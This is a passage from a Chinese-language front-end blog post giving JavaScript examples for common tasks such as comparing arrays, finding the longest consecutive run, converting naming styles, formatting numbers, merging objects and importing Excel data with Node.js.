class=\"hljs-literal\">true</span>},{min:21,max:30,minInclude:<span class=\"hljs-literal\">true</span>,maxInclude:<span class=\"hljs-literal\">true</span>}],\narr2=[{min:10,max:20,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">true</span>},{min:20,max:30,minInclude:<span class=\"hljs-literal\">true</span>,maxInclude:<span class=\"hljs-literal\">false</span>}],\narr3=[{min:10,max:20,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">true</span>},{min:20,max:30,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>}],\narr4=[{min:10,max:20,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>},{min:20,max:30,minInclude:<span class=\"hljs-literal\">true</span>,maxInclude:<span class=\"hljs-literal\">false</span>}],\narr5=[{min:10,max:20,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>},{min:21,max:30,minInclude:<span class=\"hljs-literal\">true</span>,maxInclude:<span class=\"hljs-literal\">false</span>}],\narr6=[{min:10,max:20,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>},{min:15,max:30,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>}],\narr7=[{min:10,max:20,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>},{min:20,max:30,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>}],\narr8=[{min:1,max:20,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>},{min:20,max:30,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>}],\narr9=[{min:20,max:20,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>},{min:20,max:30,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>}], \narr10=[{min:20,max:30,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>},{min:20,max:70,minInclude:<span class=\"hljs-literal\">false</span>,maxInclude:<span class=\"hljs-literal\">false</span>}];  \n</code></pre><p>运行结果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f3bf74694?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"502\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;502&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-3\">4.数组对比</h2><p>这个基于我回答过的一个问题，现在化用，改写一下</p><p>JavaScript如何对比两个数组？数组B根据数组A来做出增删？ (不用jquery，原生js)<br>具体问题是这样的：</p><p>arryA</p><pre class=\"hljs bash\"><code>var arrayA = [<span class=\"hljs-string\">'a'</span>,<span class=\"hljs-string\">'b'</span>,<span class=\"hljs-string\">'c'</span>];\n</code></pre><p>arryB</p><pre class=\"hljs bash\"><code>var arrayB = [{\n    key:<span class=\"hljs-string\">'a'</span>,\n    num1:<span class=\"hljs-string\">'1'</span>,\n    num2:<span class=\"hljs-string\">'2'</span>,\n    num3:<span class=\"hljs-string\">'3'</span>,\n    tot:<span class=\"hljs-string\">'6'</span>\n},{\n    key:<span class=\"hljs-string\">'b'</span>,\n    num1:<span class=\"hljs-string\">'11'</span>,\n    num2:<span class=\"hljs-string\">'22'</span>,\n    num3:<span class=\"hljs-string\">'33'</span>,\n    tot:<span class=\"hljs-string\">'66'</span>\n},{\n    key: <span class=\"hljs-string\">'c'</span>,\n    num1: <span class=\"hljs-string\">'111'</span>,\n    num2: <span class=\"hljs-string\">'222'</span>,\n    num3: <span class=\"hljs-string\">'333'</span>,\n    tot:666\n}];\n</code></pre><p>1、如果arryA中有a，arryB中没有，那么在arryB中增加一个key值为a的boj，且其他属性值可均为'0';如下： {key:'a',num1:'0',num2:'0',num3:'0',tot':0'}</p><p>2、如果arryA中有a，arryB中也有key值为a的obj,那么arryB则不改变，并且该obj里的其他属性和属性值均不变;</p><p>3、如果在arryA中删除了a，那么arryB中key值为a的obj整个删掉。</p><pre class=\"hljs bash\"><code>//准备临时数组\n<span class=\"hljs-keyword\">function</span> compareArr(arr1,arr2){\n    var result=[],arr;\n    //遍历\n    <span class=\"hljs-keyword\">for</span>(var i=0;i&lt;arr1.length;i++){\n        //根据arr1[i]的值，查找arrayB，如果arr2中的有满足条件（arrayB中的对象，有key值等于arrayA[i]）的项，就会返回满足条件的项，否则返回underfind;\n        arr=arr2.find(<span class=\"hljs-keyword\">function</span>(val){<span class=\"hljs-built_in\">return</span> val.key===arr1[i]});\n        //如果arr不是undefind，就会添加arr，否则添加{key:arrayA[i],num1:<span class=\"hljs-string\">'0'</span>,num2:<span class=\"hljs-string\">'0'</span>,num3:<span class=\"hljs-string\">'0'</span>,tot:<span class=\"hljs-string\">'0'</span>}。\n        arr?result.push(arr):result.push({key:arrayA[i],num1:<span class=\"hljs-string\">'0'</span>,num2:<span class=\"hljs-string\">'0'</span>,num3:<span class=\"hljs-string\">'0'</span>,tot:<span class=\"hljs-string\">'0'</span>});\n    }\n}\n\n</code></pre><p>测试</p><pre class=\"hljs bash\"><code>var arrayA = [<span class=\"hljs-string\">'b'</span>,<span class=\"hljs-string\">'c'</span>];\nvar arrayB = [{\n    key:<span class=\"hljs-string\">'a'</span>,\n    num1:<span class=\"hljs-string\">'1'</span>,\n    num2:<span class=\"hljs-string\">'2'</span>,\n    num3:<span class=\"hljs-string\">'3'</span>,\n    tot:<span class=\"hljs-string\">'6'</span>\n},{\n    key:<span class=\"hljs-string\">'b'</span>,\n    num1:<span class=\"hljs-string\">'11'</span>,\n    num2:<span class=\"hljs-string\">'22'</span>,\n    num3:<span class=\"hljs-string\">'33'</span>,\n    tot:<span class=\"hljs-string\">'66'</span>\n},{\n    key: <span class=\"hljs-string\">'c'</span>,\n    num1: <span class=\"hljs-string\">'111'</span>,\n    num2: <span class=\"hljs-string\">'222'</span>,\n    num3: <span class=\"hljs-string\">'333'</span>,\n    tot:666\n}];\ncompareArr(arrayA,arrayB);\n</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f0ca86c7f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"510\" data-height=\"77\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;510&quot; height=&quot;77&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-4\">5.学院获奖</h2><p>统计学生申请优秀毕业生，并且符合条件的（成绩优秀，拿过奖学金，获得过三好学生）。前提是要申请</p><p>大概的流程图就是像下面这样！</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f3aaeffde?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"775\" data-height=\"785\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;775&quot; height=&quot;785&quot;&gt;&lt;/svg&gt;\"></p><p>我在代码上写上注释，相信不难理解了</p><pre class=\"hljs bash\"><code>//学生列表\n//isApply：是否有申请优秀毕业生\n<span class=\"hljs-built_in\">let</span> studentList = [\n    {\n        name: <span class=\"hljs-string\">'aa'</span>,\n        isApply: <span class=\"hljs-literal\">false</span>,\n        id: 1\n    },\n    {\n        name: <span class=\"hljs-string\">'bb'</span>,\n        isApply: <span class=\"hljs-literal\">true</span>,\n        id: 2\n    },\n    {\n        name: <span class=\"hljs-string\">'cc'</span>,\n        isApply: <span class=\"hljs-literal\">true</span>,\n        id: 3\n    }\n];\n\n//申请优秀毕业生的学生 isApply:<span class=\"hljs-literal\">true</span>\n\n<span class=\"hljs-built_in\">let</span> _student = studentList.filter(<span class=\"hljs-keyword\">function</span> (item) {\n    <span class=\"hljs-built_in\">return</span> item.isApply;\n});\n//isExcellent:优秀学生的id列表\n//isScholarship:获得过奖学金的学生的id列表\n//isThreeGood:获得过三好学生的学生的id列表\n//accord:集合\n<span class=\"hljs-built_in\">let</span> isExcellent = [1, 2, 3, 4, 5], isScholarship = [4, 2, 5, 6, 2, 1, 2], isThreeGood = [2, 1, 4, 52, 36], accord = [];\n//数组去重函数\n<span class=\"hljs-keyword\">function</span> removeRepeatArr(arr) {\n    <span class=\"hljs-built_in\">return</span> arr.filter(<span class=\"hljs-keyword\">function</span> (item, index, self) {\n        <span class=\"hljs-built_in\">return</span> self.indexOf(item) === index;\n    });\n}\n\n//统计数组中，一个遇上元素的出现次数\n<span class=\"hljs-keyword\">function</span> getEleCount(obj, ele) {\n    <span class=\"hljs-built_in\">let</span> num = 0;\n    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> i = 0, len = obj.length; i &lt; len; i++) {\n        <span class=\"hljs-keyword\">if</span> (ele === obj[i]) {\n            num++;\n        }\n    }\n    <span class=\"hljs-built_in\">return</span> num;\n}\n\n//添加学生记录，把获得成绩优秀的学生的id，获得过奖学金的学生的id，获得过三好学生的id添加进去。\n//但是添加之前，要对获得成绩优秀的学生的id，获得过奖学金的学生的id，获得过三好学生的id。这个三个数组进行去重再添加进accord，因为一个学生可能不止一次成绩优秀，不止一次获得过奖学金，不止一次获得过三好学生\n//这样就方便下面的判断，只要学生的id在accord里面出现两次及以上就符合条件\naccord.push.apply(accord, removeRepeatArr(isExcellent));\naccord.push.apply(accord, removeRepeatArr(isScholarship));\naccord.push.apply(accord, removeRepeatArr(isThreeGood));\nconsole.log(accord);\n//符合条件的学生列表\n<span class=\"hljs-built_in\">let</span> accordStudent = [];\n<span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> i = 0; i &lt; _student.length; i++) {\n    //只要学生的id在accord里面出现两次及以上\n    <span class=\"hljs-keyword\">if</span> (getEleCount(accord, _student[i].id) &gt;= 2) {\n        //记录哪些学生符合条件\n        accordStudent.push(_student[i]);\n    }\n}\nconsole.log(accordStudent);\n</code></pre><h2 data-id=\"heading-5\">6.数组连续的最大长度</h2><p>这个也是出于我回答过的问题：如下</p><pre class=\"hljs bash\"><code>//假如有一个数组，下面这个数组最大的连续长度就是4——————8,9,10,11\nvar arr=[1,2,4,5,6,8,9,10,11];\n\n//代码实现\n<span class=\"hljs-keyword\">function</span> countLen(arr){\n    //如果参数不是数组或者长度为0，直接返回0\n    <span class=\"hljs-keyword\">if</span>(arr.constructor!==Array||arr.length===0){<span class=\"hljs-built_in\">return</span> 0;}\n    //首先进入当前连续长度nowLen设初始化为1，最大连续长度maxLen初始化为0\n    var nowLen=1,maxLen=0;\n    \n    <span class=\"hljs-keyword\">for</span>(var i=1,len=arr.length;i&lt;len;i++){\n        //当前数组元素是不是比上一个数组大1\n        <span class=\"hljs-keyword\">if</span>(arr[i]-arr[i-1]===1){\n            //如果是，当前连续长度nowLen+1    \n            nowLen++;\n        }\n        <span class=\"hljs-keyword\">else</span>{\n            //否则先判断，当前连续长度是否大于最大连续长度\n            <span class=\"hljs-keyword\">if</span>(maxLen&lt;nowLen){\n                //如果是就赋值\n                maxLen=nowLen\n            }\n            //当前连续长度初始化为1\n            nowLen=1;\n        }\n    }\n    //循环完再判断一次当前连续长度是否大于最大连续长度（避免最大连续长度是数组最后面几个数组时产生的bug）\n    <span class=\"hljs-keyword\">if</span>(maxLen&lt;nowLen){\n        maxLen=nowLen\n    }\n    //返回最大连续长度\n    <span class=\"hljs-built_in\">return</span> maxLen;\n}\n</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f97c50979?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"409\" data-height=\"81\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;409&quot; height=&quot;81&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f938e6dd4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"383\" data-height=\"78\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;383&quot; height=&quot;78&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-6\">7.答题连对数</h2><p>这个和上面的代码基本一样，只是判断条件毫厘之差，直接贴，大家看就好</p><pre class=\"hljs bash\"><code><span class=\"hljs-keyword\">function</span> countTrue(arr){debugger;\n    //如果参数不是数组或者长度为0，直接返回0\n    <span class=\"hljs-keyword\">if</span>(arr.constructor!==Array||arr.length===0){<span class=\"hljs-built_in\">return</span> 0;}\n    //首先初始化连续答对长度nowLen为0，最大连续答对长度maxLen为0\n    var nowLen=0,maxLen=0;\n    <span class=\"hljs-keyword\">for</span>(var i=0,len=arr.length;i&lt;len;i++){\n        //当前数组元素是不是比上一个数组大1\n        <span class=\"hljs-keyword\">if</span>(arr[i]){\n            //如果是，当前连续长度nowLen+1\n            nowLen++;\n        }\n        <span class=\"hljs-keyword\">else</span>{\n            //否则先判断，当前连续长度是否大于最大连续长度\n            <span class=\"hljs-keyword\">if</span>(maxLen&lt;nowLen){\n                //如果是就赋值\n                maxLen=nowLen\n            }\n            //当前连续长度初始化为0\n            nowLen=0;\n        }\n    }\n    //循环完再判断一次当前连续长度是否大于最大连续长度（避免最大连续长度是数组最后面几个数组时产生的bug）\n    <span class=\"hljs-keyword\">if</span>(maxLen&lt;nowLen){\n        maxLen=nowLen\n    }\n    //返回最大连续长度\n    <span class=\"hljs-built_in\">return</span> maxLen;\n}\n</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162fc1687c5d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"555\" data-height=\"116\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;555&quot; height=&quot;116&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-7\">8.命名方式转换</h2><p>比如驼峰命名方式转'-'命名方式。</p><pre class=\"hljs bash\"><code>var str = <span class=\"hljs-string\">\"shouHou\"</span>;\n//<span class=\"hljs-variable\">$1</span>-第一个括号匹配的内容\n//这个实例，<span class=\"hljs-variable\">$1</span>=<span class=\"hljs-string\">'H'</span>\nstr = str.replace(/([A-Z])/g,<span class=\"hljs-string\">\"-<span class=\"hljs-variable\">$1</span>\"</span>).toLowerCase();\n</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630133dcfdc?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"416\" data-height=\"51\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;416&quot; height=&quot;51&quot;&gt;&lt;/svg&gt;\"></p><p>比如'-'命名方式转驼峰命名方式</p><pre class=\"hljs bash\"><code>var str=<span class=\"hljs-string\">\"shou-hou\"</span>;\n//<span class=\"hljs-variable\">$0</span>-匹配的结果   <span class=\"hljs-variable\">$1</span>-第一个括号匹配的内容\n//这个实例<span class=\"hljs-variable\">$0</span>=<span class=\"hljs-string\">'-h'</span>    <span class=\"hljs-variable\">$1</span>=<span class=\"hljs-string\">'h'</span>\nstr=str.replace(/-(\\w)/g,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-variable\">$0</span>,<span class=\"hljs-variable\">$1</span>){\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-variable\">$1</span>.toUpperCase();\n}); \n</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630109a0412?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"393\" data-height=\"107\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;393&quot; height=&quot;107&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-8\">9.格式化字符</h2><p>这个最常见的就是在金额方面的显示需求上，比如后台返回10000。前端要显示成10,000或者其他格式等！</p><pre class=\"hljs bash\"><code>//str\n//size-每隔几个字符进行分割 默认3\n//delimiter-分割符 默认<span class=\"hljs-string\">','</span>\n<span class=\"hljs-keyword\">function</span> formatText(str,size,delimiter){\n    var _str=str.toString();\n    var _size=size||3,_delimiter=delimiter||<span class=\"hljs-string\">','</span>;\n    /* \n     如果_size是3\n     <span class=\"hljs-string\">\"\\d{1,3}(?=(\\d{3})+$)\"</span> \n     */\n    var regText=<span class=\"hljs-string\">'\\\\d{1,'</span>+_size+<span class=\"hljs-string\">'}(?=(\\\\d{'</span>+_size+<span class=\"hljs-string\">'})+$)'</span>;\n    /*   \n    /\\d{1,3}(?=(\\d{3})+$)/g     这个正则的意思：匹配连续的三个数字，但是这些三个数字不能是字符串的开头1-3个字符  \n     */\n    var reg=new RegExp(regText,<span class=\"hljs-string\">'g'</span>);\n    /* \n    (-?) 匹配前面的-号   (\\d+)匹配中间的数字   ((\\.\\d+)?)匹配小数点后面的数字\n    //<span class=\"hljs-variable\">$0</span>-匹配结果，<span class=\"hljs-variable\">$1</span>-第一个括号返回的内容----(-?)    <span class=\"hljs-variable\">$2</span>,<span class=\"hljs-variable\">$3</span>如此类推  \n    */\n    <span class=\"hljs-built_in\">return</span> _str.replace(/^(-?)(\\d+)((\\.\\d+)?)$/, <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-variable\">$0</span>, <span class=\"hljs-variable\">$1</span>, <span class=\"hljs-variable\">$2</span>, <span class=\"hljs-variable\">$3</span>) {\n          <span class=\"hljs-built_in\">return</span> <span class=\"hljs-variable\">$1</span> + <span class=\"hljs-variable\">$2</span>.replace(reg, <span class=\"hljs-string\">'$&amp;,'</span>) + <span class=\"hljs-variable\">$3</span>;\n    })\n}\n\n</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630326e0fee?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"422\" data-height=\"186\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;422&quot; height=&quot;186&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-9\">10.对象合并，并且记录异常数据</h2><p>这个需求，可能大家有点懵。下面实例分析<br>比如有两个都地方记录了我的信息</p><pre class=\"hljs bash\"><code><span class=\"hljs-built_in\">let</span> info1={\n        name:<span class=\"hljs-string\">\"守候\"</span>,\n        sex:<span class=\"hljs-string\">\"男\"</span>,\n        age:24,\n        job:<span class=\"hljs-string\">\"web前端\"</span>\n    },info2={\n        name:<span class=\"hljs-string\">\"守候!\"</span>,\n        country:<span class=\"hljs-string\">\"china\"</span>,\n        interest:<span class=\"hljs-string\">\"basketball\"</span>,\n        phone:<span class=\"hljs-string\">\"12345678910\"</span>,\n        job:<span class=\"hljs-string\">\"web前端\"</span>\n    }</code></pre><p>现在要合并我的信息，并且记录可能有异常的信息。比如上面的name属性，在两个对象都有，而且两个对象的值不一样，那么就不知道到底是info1中的name属性是正确的，还是info2中的name属性是正确的。所以，就得把name这个属性记录起来，方便以后核对name这个属性。</p><p>如下图</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/160716300ac749e8?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"538\" data-height=\"150\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;538&quot; height=&quot;150&quot;&gt;&lt;/svg&gt;\"></p><p>下面，一步一步来，先不管3721，直接合并属性</p><pre class=\"hljs bash\"><code><span class=\"hljs-built_in\">let</span> objAll={};\n<span class=\"hljs-keyword\">function</span> assignObj(objArr) {\n    <span class=\"hljs-built_in\">let</span> _obj={};\n    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">let</span> i=0;i&lt;objArr.length;i++){\n        _obj=Object.assign(_obj,objArr[i],{});\n    }\n    <span class=\"hljs-built_in\">return</span> JSON.parse(JSON.stringify(_obj));\n}\nobjAll=assignObj([objA,objB]); </code></pre><p>然后先准备一个字段，记录哪些异常信息</p><pre class=\"hljs bash\"><code>objAll.warnInfo=[];</code></pre><p>最后检查对象，判断哪些信息有异常</p><pre class=\"hljs bash\"><code>  <span class=\"hljs-keyword\">function</span> checkObj(_objAll,objList) {\n        //获取所有属性\n        <span class=\"hljs-built_in\">let</span> _keys=Object.keys(_objAll);\n        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">let</span> i=0;i&lt;objList.length;i++){\n            <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">let</span> j=0;j&lt;_keys.length;j++){\n                //如果_keys[j]这个属性，在objList[i]和_objAll里面都存在，而且这两个值是不一样的，那么就是一场数据，需要记录！\n                <span class=\"hljs-keyword\">if</span>(objList[i][_keys[j]]!==undefined&amp;&amp;_objAll[_keys[j]]!==objList[i][_keys[j]]){\n                    _objAll.isError.push(_keys[j]);\n                }\n            }\n        }\n        <span class=\"hljs-built_in\">return</span> _objAll;\n    }\n    console.log(checkObj(objAll,[objA,objB]));  \n     \n</code></pre><h2 data-id=\"heading-10\">11.筛选标签</h2><p>如下图，在下面渲染这个标签</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607163005707a87?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"447\" data-height=\"53\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;447&quot; height=&quot;53&quot;&gt;&lt;/svg&gt;\"></p><p>大家可能第一可能觉得压根没难度<br>就是一个对象数组：比如</p><pre class=\"hljs bash\"><code>var searchTag=[\n    {label:<span class=\"hljs-string\">'产品编码'</span>,value:<span class=\"hljs-string\">'100072236-8'</span>},\n    {label:<span class=\"hljs-string\">'产品名称'</span>,value:<span class=\"hljs-string\">'甘油'</span>}\n]</code></pre><p>但是这样的数据，显然是要经过处理生成的</p><p>因为不可能这样发送请求</p><pre class=\"hljs bash\"><code>http://example.com?产品编码=100072236-8</code></pre><p>发送过去的参数应该是这样的</p><pre class=\"hljs bash\"><code>http://example.com?proId=100072236-8\n\nvar searchParam={proId:<span class=\"hljs-string\">'100072236-8'</span>,proName:<span class=\"hljs-string\">'甘油'</span>}   </code></pre><p>怎么进行数据的处理呢，其实很简单，代码不打注释，我想都看得懂</p><pre class=\"hljs bash\"><code>var searchTag=[];\nvar searchText={proId:<span class=\"hljs-string\">'产品编码'</span>,proName:<span class=\"hljs-string\">'产品名称'</span>};\nvar searchParam={proId:<span class=\"hljs-string\">'100072236-8'</span>,proName:<span class=\"hljs-string\">'甘油'</span>};\nObject.keys(searchParam).forEach(<span class=\"hljs-keyword\">function</span> (item) {\n    searchTag.push({\n        label:searchText[item],\n        key:item,\n        value:searchParam[item]\n    })\n})\nconsole.log(searchTag)    \n</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630438868f9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"424\" data-height=\"75\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;424&quot; height=&quot;75&quot;&gt;&lt;/svg&gt;\"></p><p>有了这些数据，渲染到页面这个就简单了！</p><h2 data-id=\"heading-11\">12.导入excel内容</h2><p>就是excel上这样的内容</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/160716308aa34b59?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"365\" data-height=\"331\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;365&quot; height=&quot;331&quot;&gt;&lt;/svg&gt;\"></p><p>转成下面的数据</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/160716308ee554b8?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"337\" data-height=\"206\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;337&quot; height=&quot;206&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630906c2869?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"151\" data-height=\"64\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;151&quot; height=&quot;64&quot;&gt;&lt;/svg&gt;\"></p><p>目录如下</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630907cb32c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"375\" data-height=\"281\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;375&quot; height=&quot;281&quot;&gt;&lt;/svg&gt;\"></p><p>下面开始写代码，我们利用node.js来写</p><pre class=\"hljs bash\"><code><span class=\"hljs-built_in\">let</span> path = require(<span class=\"hljs-string\">'path'</span>);\n//使用ejsexcel读取excel文件  npm install ejsexcel --save\n<span class=\"hljs-built_in\">let</span> ejsExcel=require(<span class=\"hljs-string\">'ejsexcel'</span>);\n<span class=\"hljs-built_in\">let</span> fs=require(<span class=\"hljs-string\">'fs'</span>);\n//读取excel\n<span class=\"hljs-built_in\">let</span> exBuf=fs.readFileSync(__dirname+<span class=\"hljs-string\">'/resource/userList.xlsx'</span>);\n<span class=\"hljs-built_in\">let</span> _data=[];\n//获取成功后\nejsExcel.getExcelArr(exBuf).then(exlJson=&gt;{\n    //获取excel数据\n    <span class=\"hljs-built_in\">let</span> workBook=exlJson;\n    //获取excel第一张表 sheet1\n    <span class=\"hljs-built_in\">let</span> workSheets=workBook[0];\n    //导出js的路径\n    <span class=\"hljs-built_in\">let</span> newfilepath=path.join(__dirname,<span class=\"hljs-string\">\"/resource/test.js\"</span>);\n    //遍历第一张表的的每一行数据\n    workSheets.forEach((item,index)=&gt;{\n        //从第二行开始插入，避免连表头也插入_data里面\n        <span class=\"hljs-keyword\">if</span>(index&gt;0){\n            //往_data插入单元格个值，item[0]相当于excel中的姓名，item[1]就是excel中的联系电话\n            _data.push({\n                name:item[0],\n                phone:item[1]\n            })\n        }\n    });\n    //写入js文件\n    fs.writeFileSync(newfilepath, <span class=\"hljs-string\">'let _data='</span>+JSON.stringify(_data)+<span class=\"hljs-string\">';export {_data}'</span>);\n}).catch(error=&gt;{\n    //打印获取失败信息\n    console.log(<span class=\"hljs-string\">\"读取错误!\"</span>);\n    console.log(error);\n});</code></pre><p>然后命令行执行该js</p><pre class=\"hljs bash\"><code>$ node importFile.js\n</code></pre><p>然后就发现多了一个test.js文件</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630c7ba133d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"250\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;250&quot;&gt;&lt;/svg&gt;\"></p><p>excel的数据就这样导入成js的一个数组了，只要引入这个数组，就可以正常的使用了！</p><h2 data-id=\"heading-12\">13.随机循环</h2><p>当时接到的业务是实际显示客户的信息，感觉有点像音乐播放器的随机循环。</p><p>要求有两个：<br>1.一个提示列表里面，提示的信息每隔500ms随机展示。<br>2.同一轮循环里面，一个提示信息只能展示一次。<br>3.列表的提示信息全部展示完了，进行下一轮展示。<br>这个逻辑没什么，直接在代码打上注释，我想大家就明白了！</p><pre class=\"hljs bash\"><code>var tipList=[<span class=\"hljs-string\">'提示1'</span>,<span class=\"hljs-string\">'提示2'</span>,<span class=\"hljs-string\">'提示3'</span>,<span class=\"hljs-string\">'提示4'</span>,<span class=\"hljs-string\">'提示5'</span>,<span 